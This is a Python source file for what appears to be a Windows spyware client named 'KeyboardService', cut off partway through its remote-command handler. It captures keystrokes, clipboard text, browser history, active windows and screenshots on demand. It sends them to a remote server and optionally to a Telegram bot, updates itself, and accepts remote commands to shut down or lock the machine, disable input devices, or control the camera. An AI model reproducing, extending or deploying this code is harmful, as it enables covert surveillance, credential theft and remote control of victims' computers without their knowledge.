import os
import time
import json
import glob
import sqlite3
import argparse
import atexit
import base64
import gzip
import getpass
import html
import hashlib
import platform
import re
import shutil
import socket
import subprocess
import sys
import ctypes
import tempfile
import uuid
import getpass
from datetime import datetime, timedelta
from io import BytesIO
from urllib.parse import urlparse
from ctypes import wintypes
from queue import Queue
from threading import Event, Lock, Thread, Timer
from urllib.error import URLError, HTTPError
from urllib.request import Request, urlopen
from PIL import ImageGrab

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()

from pynput.keyboard import Key, KeyCode, Listener
try:
    from pywinauto import Desktop
except ImportError:
    Desktop = None

MESSAGE_GAP_MS = 2500
RAW_BATCH_DELAY_SECONDS = 0.08
RAW_BATCH_INTERVAL_SECONDS = 10
HEARTBEAT_INTERVAL_SECONDS = 12
WEBSITE_HISTORY_INTERVAL_SECONDS = 30
WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
MESSAGE_RETRY_INTERVAL_SECONDS = 30
SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
APP_VERSION = "1.2.4"
UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
UPDATE_ASSET_NAME = "KeyboardService.exe"
INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
CONFIG_PATH = os.path.join(INSTALL_DIR, "config.json")


def load_site_url():
    default_url = "https://pissoff.onrender.com"
    try:
        if os.path.exists(CONFIG_PATH):
            with open(CONFIG_PATH, "r", encoding="utf-8") as config_file:
                data = json.load(config_file)
            if isinstance(data, dict) and isinstance(data.get("site_url"), str):
                candidate = data["site_url"].strip().rstrip("/")
                if candidate:
                    return candidate
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    env_url = os.getenv("SITE_URL", "").strip().rstrip("/")
    if env_url:
        return env_url
    return default_url


parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--site-url", default=load_site_url())
parser.add_argument("--post-update-success", action="store_true", default=False)
parser.add_argument("--previous-version", default="")
parser.add_argument("--new-version", default="")
args, _ = parser.parse_known_args()
SITE_URL = args.site_url.strip().rstrip("/")
POST_UPDATE_SUCCESS = bool(args.post_update_success)
PREVIOUS_VERSION = (args.previous_version or "").strip()
NEW_VERSION = (args.new_version or "").strip()
device_name = platform.node() or socket.gethostname() or "Unknown device"
device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
message_buffer = ""
raw_message_buffer = ""
raw_log_buffer = ""
raw_log_target = None
raw_flush_timer = None
raw_batch_events = []
raw_batch_started_at = None
raw_batch_lock = Lock()
last_key_time_ms = None
message_started_ms = None
active_target = None
active_target_key = None
active_modifiers = set()
state_lock = Lock()
message_queue = Queue()
client_started_at = int(time.time() * 1000)
STARTUP_ENTRY_NAME = "KeyboardService"
PENDING_MESSAGES_PATH = os.path.join(INSTALL_DIR, "pending_messages.json")
PENDING_RAW_BATCHES_PATH = os.path.join(INSTALL_DIR, "pending_raw_batches.json")
SESSION_ID = uuid.uuid4().hex
pending_messages_lock = Lock()
last_message_id = 0
SERVICE_KEYBOARD_LISTENER = None
collection_paused = False
update_lock = Lock()
mouse_disable_lock = Lock()
keyboard_disable_lock = Lock()
camera_disable_lock = Lock()
mouse_hook_callback = None
keyboard_hook_callback = None
browser_history_seen = set()

SHIFTED_SYMBOLS = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
    ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
}


def telegram_configured():
    return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)


def send_telegram_log(message):
    if not telegram_configured():
        return

    text = str(message).strip()
    if not text:
        return
    escaped = html.escape(text)
    try:
        payload = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": (
                "<b>┌─[ LOG // CLIENT ]</b>\n"
                f"<pre>{escaped[:3900]}</pre>\n"
                "<b>└─[ KeyboardClient // STREAM ]</b>"
            ),
            "parse_mode": "HTML",
        }).encode("utf-8")
        request = Request(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except Exception:
        pass


class TelegramLogProxy:
    def __init__(self, stream):
        self.stream = stream

    def write(self, data):
        text = data.rstrip("\r\n")
        if text:
            self.stream.write(data)
            self.stream.flush()
            try:
                send_telegram_log(text)
            except Exception:
                pass
        else:
            self.stream.write(data)
            self.stream.flush()

    def flush(self):
        self.stream.flush()

    def isatty(self):
        return getattr(self.stream, "isatty", lambda: False)()


if os.environ.get("TELEGRAM_BOT_TOKEN") and os.environ.get("TELEGRAM_CHAT_ID"):
    sys.stdout = TelegramLogProxy(sys.stdout)
    sys.stderr = TelegramLogProxy(sys.stderr)


def get_active_app():
    if os.name != "nt":
        return "Unknown app"

    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return "Unknown app"

    title_buffer = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, title_buffer, len(title_buffer))
    title = title_buffer.value.strip()

    process_id = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(process_id))
    kernel32 = ctypes.windll.kernel32
    process = kernel32.OpenProcess(0x1000, False, process_id.value)
    executable = ""
    if process:
        executable_buffer = ctypes.create_unicode_buffer(512)
        executable_length = wintypes.DWORD(len(executable_buffer))
        if kernel32.QueryFullProcessImageNameW(
            process, 0, executable_buffer, ctypes.byref(executable_length)
        ):
            executable = os.path.basename(executable_buffer.value)
        kernel32.CloseHandle(process)

    if title and executable:
        return f"{executable} - {title}"
    return title or executable or "Unknown app"


def get_active_target():
    app_name = get_active_app()
    if os.name != "nt" or Desktop is None:
        return app_name, app_name

    try:
        window = Desktop(backend="uia").get_active()
        focused_control = window.get_focus()
        control_type = focused_control.element_info.control_type or "Control"
        control_name = (focused_control.window_text() or "").strip()
        if not control_name:
            control_name = (focused_control.element_info.name or "").strip()
        automation_id = (focused_control.element_info.automation_id or "").strip()
        details = control_name or automation_id or control_type
        if control_name and control_type.lower() not in control_name.lower():
            details = f"{control_type}: {control_name}"
        target = f"{app_name} | {details}"
        target_key = f"{app_name}|{control_type}|{control_name}|{automation_id}"
        return target, target_key
    except Exception:
        return app_name, app_name


BROWSER_EXECUTABLES = (
    "chrome.exe",
    "msedge.exe",
    "edge.exe",
    "firefox.exe",
    "brave.exe",
    "opera.exe",
)


def browser_name_from_active_app(app_name):
    candidate = str(app_name or "").strip()
    if not candidate:
        return ""
    executable = candidate.split(" - ", 1)[0].strip().replace("\\", "/")
    base_name = os.path.basename(executable).lower().strip()
    if base_name:
        normalized_base = base_name.lower()
        if normalized_base in BROWSER_EXECUTABLES:
            return normalized_base
        if normalized_base.endswith(".exe"):
            return normalized_base
        if "google chrome" in candidate.lower():
            return "chrome.exe"
        if "microsoft edge" in candidate.lower() or "edge" in candidate.lower():
            return "msedge.exe"
        if "firefox" in candidate.lower():
            return "firefox.exe"
        if "brave" in candidate.lower():
            return "brave.exe"
        if "opera" in candidate.lower():
            return "opera.exe"
        return base_name

    lowered = candidate.lower()
    if "google chrome" in lowered:
        return "chrome.exe"
    if "microsoft edge" in lowered or "edge" in lowered:
        return "msedge.exe"
    if "firefox" in lowered:
        return "firefox.exe"
    if "brave" in lowered:
        return "brave.exe"
    if "opera" in lowered:
        return "opera.exe"
    return ""


def latest_browser_history_url(app_name):
    app_browser = browser_name_from_active_app(app_name)
    if not app_browser:
        return ""

    desired_browser = app_browser.lower().replace(".exe", "")
    browser_aliases = {
        "chrome": "Chrome",
        "msedge": "Edge",
        "edge": "Edge",
        "firefox": "Firefox",
        "brave": "Brave",
        "opera": "Opera",
    }
    target_browser = browser_aliases.get(desired_browser, desired_browser.title())

    latest_url = ""
    latest_time = -1
    for browser_name, db_path in browser_history_paths():
        normalized_db_browser = browser_name.lower()
        if normalized_db_browser != target_browser.lower():
            continue
        for entry in collect_browser_history_entries(browser_name, db_path):
            if not entry.get("url", "").startswith(("http://", "https://")):
                continue
            visited_at = int(entry.get("visited_at", 0) or 0)
            if visited_at > latest_time:
                latest_time = visited_at
                latest_url = str(entry["url"])
    return latest_url


def get_browser_url(app_name):
    if os.name != "nt" or Desktop is None:
        return ""
    executable = browser_name_from_active_app(app_name)
    if executable not in BROWSER_EXECUTABLES:
        return ""

    try:
        window = Desktop(backend="uia").get_active()
        candidate_values = []
        for control in window.descendants():
            if control is None:
                continue
            try:
                control_type = (control.element_info.control_type or "").lower()
            except Exception:
                control_type = ""
            for value in (
                control.window_text(),
                control.element_info.name,
                control.element_info.automation_id,
            ):
                if value is None:
                    continue
                text = str(value).strip()
                if not text:
                    continue
                if any(marker in text.lower() for marker in ("address", "search", "url", "location", "omnibox")):
                    candidate_values.append(text)
                elif control_type in {"edit", "combobox", "pane", "group", "text"} and text.startswith(("http://", "https://")):
                    candidate_values.append(text)
        for value in candidate_values:
            if value.startswith(("http://", "https://")):
                parsed = urlparse(value)
                if parsed.scheme in ("http", "https") and parsed.netloc:
                    return value
    except Exception:
        return ""
    return ""


def get_message_source_url(app_name):
    candidate = str(app_name or "").strip()
    if not candidate:
        return ""
    browser_url = get_browser_url(candidate)
    if browser_url:
        return browser_url
    if browser_name_from_active_app(candidate):
        return latest_browser_history_url(candidate)
    return ""


def windows_filetime_to_epoch_ms(value):
    try:
        integer_value = int(value)
    except (TypeError, ValueError):
        return 0
    return int((integer_value / 1000) - 11644473600000)


def browser_history_paths():
    local_appdata = os.getenv("LOCALAPPDATA") or os.path.join(os.path.expanduser("~"), "AppData", "Local")
    roaming_appdata = os.getenv("APPDATA") or os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
    pattern_map = [
        ("Chrome", os.path.join(local_appdata, "Google", "Chrome", "User Data", "*", "History")),
        ("Chrome", os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default", "History")),
        ("Edge", os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "*", "History")),
        ("Edge", os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default", "History")),
        ("Brave", os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "*", "History")),
        ("Brave", os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")),
        ("Opera", os.path.join(local_appdata, "Opera Software", "Opera Stable", "History")),
        ("Opera", os.path.join(local_appdata, "Opera Software", "Opera GX Stable", "History")),
        ("Firefox", os.path.join(roaming_appdata, "Mozilla", "Firefox", "Profiles", "*", "places.sqlite")),
    ]
    discovered_paths = []
    seen_paths = set()
    for browser_name, pattern in pattern_map:
        for candidate in sorted(glob.glob(pattern)):
            normalized = os.path.normcase(os.path.abspath(candidate))
            if normalized in seen_paths or not os.path.exists(candidate):
                continue
            seen_paths.add(normalized)
            discovered_paths.append((browser_name, candidate))
    return discovered_paths


def collect_browser_history_entries(browser_name, db_path):
    if not db_path or not os.path.exists(db_path):
        return []

    snapshot_path = None

    def remove_snapshot_files():
        if not snapshot_path:
            return
        for path in (snapshot_path, f"{snapshot_path}-wal", f"{snapshot_path}-shm"):
            try:
                os.remove(path)
            except OSError:
                pass

    try:
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as snapshot_file:
            snapshot_path = snapshot_file.name
        shutil.copy2(db_path, snapshot_path)
        for suffix in ("-wal", "-shm"):
            sidecar_path = f"{db_path}{suffix}"
            if os.path.exists(sidecar_path):
                shutil.copy2(sidecar_path, f"{snapshot_path}{suffix}")
        connection = sqlite3.connect(f"file:{snapshot_path}?mode=ro", uri=True)
    except (OSError, sqlite3.DatabaseError):
        remove_snapshot_files()
        return []

    try:
        if browser_name.lower() == "firefox":
            query = """
                SELECT p.url, p.title, h.visit_date
                FROM moz_historyvisits h
                JOIN moz_places p ON p.id = h.place_id
                WHERE p.url LIKE 'http%' OR p.url LIKE 'https%'
                ORDER BY h.visit_date DESC
            """
            rows = connection.execute(query).fetchall()
            entries = []
            for url, title, visit_date in rows:
                if not url or not str(url).startswith(("http://", "https://")):
                    continue
                try:
                    visited_at = int(int(visit_date) / 1000)
                except (TypeError, ValueError):
                    continue
                if visited_at <= 0:
                    continue
                entries.append({
                    "browser": browser_name,
                    "url": str(url),
                    "visited_at": visited_at,
                })
            return entries

        query = """
            SELECT url, title, last_visit_time
            FROM urls
            WHERE url LIKE 'http%' OR url LIKE 'https%'
            ORDER BY last_visit_time DESC
        """
        rows = connection.execute(query).fetchall()
        entries = []
        for url, title, last_visit_time in rows:
            if not url or not str(url).startswith(("http://", "https://")):
                continue
            visited_at = windows_filetime_to_epoch_ms(last_visit_time)
            if visited_at <= 0:
                continue
            entries.append({
                "browser": browser_name,
                "url": str(url),
                "visited_at": visited_at,
            })
        return entries
    except (sqlite3.DatabaseError, sqlite3.OperationalError):
        return []
    finally:
        connection.close()
        remove_snapshot_files()


def sync_browser_history():
    global browser_history_seen
    cutoff_ms = int((datetime.now().astimezone() - timedelta(seconds=WEBSITE_HISTORY_MAX_AGE_SECONDS)).timestamp() * 1000)

    for browser_name, db_path in browser_history_paths():
        for entry in collect_browser_history_entries(browser_name, db_path):
            if entry["visited_at"] < cutoff_ms:
                continue
            cache_key = (browser_name, entry["url"], entry["visited_at"])
            if cache_key in browser_history_seen:
                continue
            if post_website_history(entry["url"], browser_name, entry["visited_at"]):
                browser_history_seen.add(cache_key)


def get_clipboard_text():
    if os.name != "nt":
        return ""

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    user32.GetClipboardData.argtypes = [wintypes.UINT]
    user32.GetClipboardData.restype = ctypes.c_void_p
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalUnlock.restype = wintypes.BOOL
    text = ""
    if not user32.OpenClipboard(None):
        return text
    try:
        handle = user32.GetClipboardData(13)
        if handle:
            pointer = kernel32.GlobalLock(handle)
            if pointer:
                try:
                    text = ctypes.wstring_at(pointer)
                finally:
                    kernel32.GlobalUnlock(handle)
    finally:
        user32.CloseClipboard()
    return text


def normalize_key(key):
    if key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r,
               Key.alt, Key.alt_l, Key.alt_r, Key.cmd, Key.cmd_l, Key.cmd_r):
        return ""
    if key == Key.space:
        return " "
    if key == Key.enter:
        return "\n"
    if key == Key.tab:
        return "\t"
    if key == Key.backspace:
        return "\b"
    if isinstance(key, KeyCode) and key.char is not None:
        value = key.char
        if ord(value) < 32:
            return ""
        if Key.shift in active_modifiers and value.isalpha():
            return value.upper()
        return SHIFTED_SYMBOLS.get(value, value) if Key.shift in active_modifiers else value
    return ""


def capture_desktop_screenshot():
    try:
        image = ImageGrab.grab(all_screens=False)
        image.thumbnail((1024, 640))
        output = BytesIO()
        image.convert("RGB").save(output, format="JPEG", quality=70, optimize=True)
        return base64.b64encode(output.getvalue()).decode("ascii")
    except Exception as error:
        report_screenshot_status("Failed", f"Desktop capture error: {type(error).__name__}")
        return ""


def get_device_telemetry():
    local_now = datetime.now().astimezone()
    telemetry = {
        "local_time": local_now.isoformat(timespec="seconds"),
        "local_time_ms": int(local_now.timestamp() * 1000),
        "logged_in_user": getpass.getuser() or "Unknown user",
        "battery_percent": None,
        "battery_status": "Unknown",
        "open_apps": get_open_apps(),
    }
    if os.name != "nt":
        return telemetry
    try:
        class SystemPowerStatus(ctypes.Structure):
            _fields_ = [
                ("ac_line_status", ctypes.c_ubyte),
                ("battery_flag", ctypes.c_ubyte),
                ("battery_percent", ctypes.c_ubyte),
                ("reserved", ctypes.c_ubyte),
                ("battery_life_time", ctypes.c_ulong),
                ("battery_full_life_time", ctypes.c_ulong),
            ]

        power_status = SystemPowerStatus()
        if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(power_status)):
            return telemetry
        if power_status.battery_flag == 128:
            telemetry["battery_status"] = "No battery"
        elif power_status.battery_percent <= 100:
            telemetry["battery_percent"] = power_status.battery_percent
            telemetry["battery_status"] = "Charging" if power_status.ac_line_status == 1 else "On battery"
        else:
            telemetry["battery_status"] = "Unknown"
    except Exception:
        pass
    return telemetry


def get_open_apps():
    if os.name != "nt":
        return []
    try:
        titles = []
        user32 = ctypes.windll.user32
        enum_windows = user32.EnumWindows
        enum_windows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
        enum_windows.restype = wintypes.BOOL
        callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

        @callback_type
        def collect_window(hwnd, _lparam):
            if not user32.IsWindowVisible(hwnd):
                return True
            length = user32.GetWindowTextLengthW(hwnd)
            if length <= 0:
                return True
            title_buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, title_buffer, length + 1)
            title = title_buffer.value.strip()
            if title and title not in titles:
                titles.append(title)
            return len(titles) < 30

        enum_windows(collect_window, 0)
        return titles
    except (AttributeError, OSError, TypeError):
        return []


def raw_key_value(key):
    if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
        return "[CTRL]"
    if key in (Key.shift, Key.shift_l, Key.shift_r):
        return "[SHIFT]"
    if key in (Key.alt, Key.alt_l, Key.alt_r):
        return "[ALT]"
    if key in (Key.cmd, Key.cmd_l, Key.cmd_r):
        return "[CMD]"
    if key == Key.space:
        return "[SPACE]"
    if key == Key.enter:
        return "[ENTER]"
    if key == Key.tab:
        return "[TAB]"
    if key == Key.backspace:
        return "[BACKSPACE]"
    if isinstance(key, KeyCode) and key.char is not None:
        return key.char
    if isinstance(key, Key):
        return f"[{str(key).split('.')[-1].upper()}]"
    return ""


def load_pending_messages():
    try:
        with open(PENDING_MESSAGES_PATH, "r", encoding="utf-8") as pending_file:
            messages = json.load(pending_file)
            return messages if isinstance(messages, list) else []
    except (FileNotFoundError, OSError, json.JSONDecodeError):
        return []


def save_pending_messages(messages):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    fd, temporary_path = tempfile.mkstemp(
        prefix="pending_messages_", suffix=".tmp", dir=INSTALL_DIR
    )
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
            json.dump(messages, pending_file)
        os.replace(temporary_path, PENDING_MESSAGES_PATH)
    finally:
        if os.path.exists(temporary_path):
            os.unlink(temporary_path)


def remember_pending_message(payload):
    with pending_messages_lock:
        messages = load_pending_messages()
        messages.append(payload)
        save_pending_messages(messages)


def forget_pending_message(payload):
    with pending_messages_lock:
        messages = load_pending_messages()
        try:
            messages.remove(payload)
        except ValueError:
            return
        if messages:
            save_pending_messages(messages)
        elif os.path.exists(PENDING_MESSAGES_PATH):
            os.unlink(PENDING_MESSAGES_PATH)


def load_pending_raw_batches():
    try:
        with open(PENDING_RAW_BATCHES_PATH, "r", encoding="utf-8") as pending_file:
            batches = json.load(pending_file)
            return batches if isinstance(batches, list) else []
    except (FileNotFoundError, OSError, json.JSONDecodeError):
        return []


def save_pending_raw_batches(batches):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    fd, temporary_path = tempfile.mkstemp(
        prefix="pending_raw_batches_", suffix=".tmp", dir=INSTALL_DIR
    )
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
            json.dump(batches, pending_file)
        os.replace(temporary_path, PENDING_RAW_BATCHES_PATH)
    finally:
        if os.path.exists(temporary_path):
            os.unlink(temporary_path)


def remember_raw_batch(payload):
    with raw_batch_lock:
        batches = load_pending_raw_batches()
        batches.append(payload)
        save_pending_raw_batches(batches)


def forget_raw_batch(payload):
    with raw_batch_lock:
        batches = [
            batch for batch in load_pending_raw_batches()
            if batch.get("batch_id") != payload.get("batch_id")
        ]
        if batches:
            save_pending_raw_batches(batches)
        elif os.path.exists(PENDING_RAW_BATCHES_PATH):
            os.unlink(PENDING_RAW_BATCHES_PATH)


def post_raw_batch(payload):
    try:
        request = Request(
            f"{SITE_URL}/api/raw-batches",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError):
        return False


def upload_raw_batch(events):
    if not events:
        return
    payload_json = json.dumps(events, separators=(",", ":")).encode("utf-8")
    payload = {
        "batch_id": uuid.uuid4().hex,
        "device_id": device_id,
        "device_name": device_name,
        "session_id": SESSION_ID,
        "started_at": events[0]["time"],
        "ended_at": events[-1]["time"],
        "event_count": len(events),
        "payload_base64": base64.b64encode(gzip.compress(payload_json)).decode("ascii"),
    }
    remember_raw_batch(payload)
    if post_raw_batch(payload):
        forget_raw_batch(payload)


def retry_pending_raw_batches():
    for payload in load_pending_raw_batches():
        if post_raw_batch(payload):
            forget_raw_batch(payload)


def post_message(payload, quiet=False):
    try:
        headers = {"Content-Type": "application/json"}
        request = Request(
            f"{SITE_URL}/api/messages",
            data=json.dumps(payload).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        if not quiet:
            print(f"Could not send message: {error}")
        return False


def post_website_history(url, browser, visited_at=None):
    visited_at = visited_at or int(time.time() * 1000)
    if visited_at < int(time.time() * 1000) - WEBSITE_HISTORY_MAX_AGE_SECONDS * 1000:
        return False
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/website-history",
            data=json.dumps({
                "device_id": device_id,
                "device_name": device_name,
                "browser": browser,
                "url": url,
                "visited_at": visited_at,
            }).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
            try:
                result = json.loads(response.read().decode("utf-8"))
            except (UnicodeDecodeError, ValueError) as error:
                raise RuntimeError("History endpoint returned a non-JSON response") from error
            if not isinstance(result, dict) or result.get("ok") is not True:
                raise RuntimeError("History endpoint did not confirm the visit")
        report_website_history_status("Saved", "Last URL stored successfully.")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        if isinstance(error, HTTPError):
            try:
                detail = error.read().decode("utf-8", errors="replace")[:240]
            except OSError:
                detail = "no response body"
            report_website_history_status("Failed", f"History HTTP {error.code}: {detail}")
        elif isinstance(error, URLError):
            report_website_history_status("Failed", f"History network error: {error.reason}")
        else:
            report_website_history_status("Failed", f"History error: {error}")
        return False


def report_website_history_status(status, message):
    try:
        request = Request(
            f"{SITE_URL}/api/devices/website-history-status",
            data=json.dumps({"device_id": device_id, "status": status, "message": message}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError):
        pass


def acknowledge_device_command(command_id, status, error=""):
    if not command_id:
        return
    try:
        request = Request(
            f"{SITE_URL}/api/devices/{device_id}/commands/{command_id}/ack",
            data=json.dumps({"status": status, "error": error}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError) as ack_error:
        print(f"Could not acknowledge device command: {ack_error}")


def website_history_sender():
    last_url = ""
    while True:
        try:
            if collection_paused:
                time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)
                continue
            sync_browser_history()
            active_app = get_active_app()
            browser_url = get_browser_url(active_app)
            if not browser_url and active_app:
                browser_url = latest_browser_history_url(active_app)
            if not active_app:
                time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)
                continue
            if not browser_url:
                print(f"Website history skipped: active app={active_app!r}, browser_url=empty")
            elif browser_url == last_url:
                print(f"Website history skipped: same URL already sent: {browser_url}")
            else:
                print(f"Website history capture: app={active_app!r}, url={browser_url}")
                if post_website_history(browser_url, active_app.split(" - ", 1)[0].strip()):
                    last_url = browser_url
        except Exception as error:
            print(f"Website history sender exception: {type(error).__name__}: {error}")
        time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)


def upload_device_screenshot(screenshot_base64):
    if not screenshot_base64:
        report_screenshot_status("Failed", "The desktop capture returned no image.")
        return False
    report_screenshot_status("Uploading", "Uploading the screenshot to the server.")
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/devices/screenshot-upload",
            data=json.dumps({
                "device_id": device_id,
                "screenshot_base64": screenshot_base64,
            }).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=90) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not upload device screenshot: {error}")
        if isinstance(error, HTTPError):
            detail = error.read().decode("utf-8", errors="replace")[:240]
            report_screenshot_status("Failed", f"Upload rejected ({error.code}): {detail}")
        elif isinstance(error, URLError):
            report_screenshot_status("Failed", f"Upload network error: {error.reason}")
        elif isinstance(error, TimeoutError):
            report_screenshot_status("Failed", "Upload timed out.")
        return False


def report_screenshot_status(status, message):
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/devices/screenshot-status",
            data=json.dumps({
                "device_id": device_id,
                "status": status,
                "message": message,
            }).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not report screenshot status: {error}")


def trigger_screenshot_capture():
    report_screenshot_status("Capturing", "Reading the desktop image.")
    capture_thread = Thread(target=lambda: upload_device_screenshot(capture_desktop_screenshot()), daemon=True)
    capture_thread.start()
    capture_thread.join(60)
    if capture_thread.is_alive():
        report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")


def poll_screenshot_request():
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/devices/{device_id}/screenshot-request",
            headers=headers,
            method="GET",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
            data = json.loads(response.read().decode("utf-8"))
        handle_device_command(data.get("command"), data.get("command_id"), data.get("message", ""))
        if data.get("screenshot_requested"):
            trigger_screenshot_capture()
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        if isinstance(error, HTTPError):
            detail = error.read().decode("utf-8", errors="replace")[:240]
            print(f"Could not poll screenshot request: HTTP {error.code}: {detail}")
        else:
            print(f"Could not poll screenshot request: {error}")


def screenshot_request_poller():
    while True:
        poll_screenshot_request()
        time.sleep(SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS)


def handle_device_command(command, command_id=None, message=""):
    global collection_paused
    if not command:
        return
    try:
        shutdown_path = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "shutdown.exe")
        if command == "shutdown":
            subprocess.Popen([shutdown_path, "/s", "/t", "0"], close_fds=True)
        elif command == "logout":
            subprocess.Popen([shutdown_path, "/l"], close_fds=True)
        elif command == "restart":
            subprocess.Popen([shutdown_path, "/r", "/t", "0"], close_fds=True)
        elif command == "lock":
            if os.name != "nt":
                raise RuntimeError("Lock is only supported on Windows")
            ctypes.windll.user32.LockWorkStation()
        elif command == "pause":
            flush_message_buffer()
            collection_paused = True
        elif command == "resume":
            collection_paused = False
        elif command == "disable_mouse":
            if os.name != "nt":
                raise RuntimeError("Mouse disabling is only supported on Windows")
            try:
                duration = int(str(message).strip())
            except ValueError as error:
                raise RuntimeError("Mouse duration must be a whole number of seconds") from error
            if duration < 1 or duration > 3600:
                raise RuntimeError("Mouse duration must be between 1 and 3600 seconds")
            start_mouse_disable(duration)
        elif command == "disable_keyboard":
            if os.name != "nt":
                raise RuntimeError("Keyboard disabling is only supported on Windows")
            try:
                duration = int(str(message).strip())
            except ValueError as error:
                raise RuntimeError("Keyboard duration must be a whole number of seconds") from error
            if duration < 1 or duration > 3600:
                raise RuntimeError("Keyboard duration must be between 1 and 3600 seconds")
            start_keyboard_disable(duration)
        elif command in {"disable_camera", "open_camera"}:
            if os.name != "nt":
                raise RuntimeError("Camera control is only supported on Windows")
            try:
                duration = int(str(message).strip())
            except ValueError as error:
                raise RuntimeError("Camera duration must be a whole number of seconds") from error
            if duration < 1 or duration > 3600:
                raise RuntimeError("Camera duration must be between 1 and 3600 seconds")
            if command == "open_camera":
                open_camera_app(duration)
            else:
                start_camera_disable(duration)
        elif command == "close_app":
            if os.name != "nt":
